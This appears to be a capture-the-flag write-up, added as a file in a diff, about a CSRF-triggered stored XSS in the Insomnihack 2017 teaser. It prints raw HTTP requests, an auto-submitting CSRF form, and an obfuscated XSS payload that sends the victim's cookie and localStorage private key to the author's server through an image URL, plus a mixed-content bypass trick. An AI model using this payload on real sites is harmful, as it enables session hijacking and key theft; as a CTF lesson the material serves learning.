@@ -1,0 +1,75 @@
+This was a CSRF + XSS challenge. The website encrypted and stored files using keys stored in localStorage.
+
+There was a XSS on user signup in name, when registering a user you get this returned:
+POST /api/user.php HTTP/1.1
+
+Host: ssc.teaser.insomnihack.ch
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Referer: https://ssc.teaser.insomnihack.ch/login
+Content-Length: 70
+Cookie: __cfduid=deebaca2cb7cff761de82752338f1b5bc1485034153; PHPSESSID=cl153b8i0bcka45paspadrnfs1
+Connection: close
+
+action=login&name=asd<img src=asd onError='alert(1337);'>&password=asd
+
+
+HTTP/1.1 200 OK
+Date: Mon, 23 Jan 2017 14:58:45 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Set-Cookie: PHPSESSID=a1n3u6et0r48nql5mfh5s6n1v1; path=/
+Vary: Accept-Encoding
+Content-Length: 70
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+{"status":"SUCCESS","name":"asd<img src=asd onError='alert(1337);'>"}
+
+
+Since the response content-type is text/html and not application/json or similar the page is vulnerable to CSRF XSS.
+In the first challenge (part of three series) there was a pcap with the text:
+11:56 <Tu1tiFru1ti> I'll be checking this mail box every now and then if you have any information for me. I'm always interested in learning, so if you have any good links, please send them over.\r\n
+
+The mail address was: rouge@ssc.teaser.insomihack.ch
+
+So I sent a mail to the address with a link pointing to my server and:
+52.214.142.175 - - [22/Jan/2017:16:49:44 +0100] "GET / HTTP/1.1" 200 1170 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
+
+So it was obvious you had to CSRF the admins browser and steal localStorage keys and such:
+<body>
+  <iframe name="yolo" src="https://ssc.teaser.insomnihack.ch/"></iframe>
+  <form id="test" action="https://ssc.teaser.insomnihack.ch/api/user.php" method="POST" target="yolo">
+    <input id="action" type="hidden" name="action" value="login">
+    <input id="name" type="hidden" name="name" value="asd<img src=asd onError='alert(1337);'>">
+    <input id="password" type="hidden" name="password" value="asd">
+</form>
+<br/>
+<br/>
+<br/>
+<script>
+  document.forms[0].submit();
+</script>
+</body>
+		  
+
+I continued with creating a user with this payload:
+<img src=asd onError='(function(){a=document.cookie;b=localStorage.getItem(String.fromCharCode(112,114,105,118,97,116,101,75,101,121));var bajs = document.createElement(String.fromCharCode(105,109,103));document.body.appendChild(bajs);bajs.src=String.fromCharCode(encoded_ip_removed)+a+b;}())'>
+
+What this does is dynamically create an image pointing to my own server that has the localStorage.getItem("privateKey") and document.cookie in its src. String.fromCharCode wasn't really necesarry but I started using it for and just went with it, #yolo. The challenge server was listening on HTTPs and if you are XSS'ing and pointing some resources to a HTTP server it blocks loading because of Mixed-content warnings but this can be bypased creating a image to the "drop-server" with the appended payload! (Images are allowed to load over http on https enabled sites)
+
+And we get:
+52.214.142.175 - - [22/Jan/2017:17:27:36 +0100] "GET /PHPSESSID=s4gm53rltv44r9ui4i2alk5pa2%7B%22alg%22:%22RSA-OAEP-256%22,%22d%22:%22C ... {snip}
+
+I got stuck here thinking that localStorage was "renewed" every time I created a user and what i retrieved was my newly created users localStorage. Since the XSS was in user-signup I tried different strategies in retrieving sessid and the admins localStorage keys. When the CTF was over I read different writeups and I realized this was not the case, and the flag was in localStorage.getItem('flag')... So yeah.. big fail from my part but I learned my lesson :p.
+
+Lesson learned:
+Study the javascript source more
+localStorage does not get renewed unless the site specifically does this in a script
+localStorage does not get renewed unless the site specifically does this in a script
+localStorage does not get renewed unless the site specifically does this in a script
